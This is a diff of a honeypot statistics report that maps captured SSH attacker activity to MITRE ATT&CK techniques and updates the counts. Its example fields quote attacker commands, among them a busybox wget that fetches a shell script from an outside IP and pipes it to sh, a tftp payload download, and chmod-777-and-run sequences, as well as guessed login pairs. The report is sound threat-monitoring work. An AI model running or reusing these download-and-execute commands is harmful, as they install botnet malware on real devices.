@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-15 17:03:45",
+  "generated": "2026-08-15 18:04:36",
   "totals": {
-    "commands": 1010,
-    "login_failed": 2686,
-    "login_success": 129,
-    "sessions": 2888
+    "commands": 1064,
+    "login_failed": 2726,
+    "login_success": 132,
+    "sessions": 2955
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 2686,
+      "count": 2726,
       "examples": [
         "adminuser / 123456",
         "root / Qq123456",
@@ -21,14 +21,14 @@
         "milad / milad"
       ],
       "first": "2026-08-15T00:00:01.563880Z",
-      "last": "2026-08-15T17:02:53.338814Z",
-      "unique_ips": 100
+      "last": "2026-08-15T18:03:31.748670Z",
+      "unique_ips": 101
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 190,
+      "count": 192,
       "examples": [
         "/bin/busybox cp /bin/busybox condi72; >condi72; /bin/busybox chmod 777 condi72; /bin/busybox condixx",
         "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t",
@@ -37,14 +37,14 @@
         ">/var/tmp/d && chmod 777 /var/tmp/d && /var/tmp/d && cd /var/tmp/"
       ],
       "first": "2026-08-15T00:48:26.058950Z",
-      "last": "2026-08-15T15:03:38.094129Z",
+      "last": "2026-08-15T17:48:03.784130Z",
       "unique_ips": 20
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 129,
+      "count": 132,
       "examples": [
         "enable / system",
         " / ",
@@ -53,7 +53,7 @@
         "admin / admin"
       ],
       "first": "2026-08-15T00:02:00.287482Z",
-      "last": "2026-08-15T16:37:55.289453Z",
+      "last": "2026-08-15T17:48:01.980613Z",
       "unique_ips": 72
     },
     {
@@ -218,23 +218,23 @@
   "unmapped": [
     [
       "/bin/busybox",
-      371
+      372
     ],
     [
       "sh",
-      84
+      87
     ],
     [
       "shell",
-      72
+      75
     ],
     [
       "system",
-      61
+      64
     ],
     [
       "enable",
-      30
+      33
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
@@ -242,23 +242,23 @@
     ],
     [
       "linuxshell",
-      18
+      21
     ],
     [
       "cd /proc && cat self/cmdline",
-      18
+      19
     ],
     [
       "enablelinuxshell",
-      16
+      17
     ],
     [
       "ping ;sh",
-      16
+      17
     ],
     [
       "busybox",
-      14
+      15
     ],
     [
       "shel",
@@ -274,27 +274,27 @@
     ],
     [
       ">/tmp/.codi && cd /tmp/",
-      2
+      4
     ],
     [
       ">/var/.codi && cd /var/",
-      2
+      4
     ],
     [
       ">/dev/.codi && cd /dev/",
-      2
+      4
     ],
     [
       ">/mnt/.codi && cd /mnt/",
-      2
+      4
     ],
     [
       ">/var/run/.codi && cd /var/run/",
-      2
+      4
     ],
     [
       ">/var/tmp/.codi && cd /var/tmp/",
-      2
+      4
     ]
   ]
 }
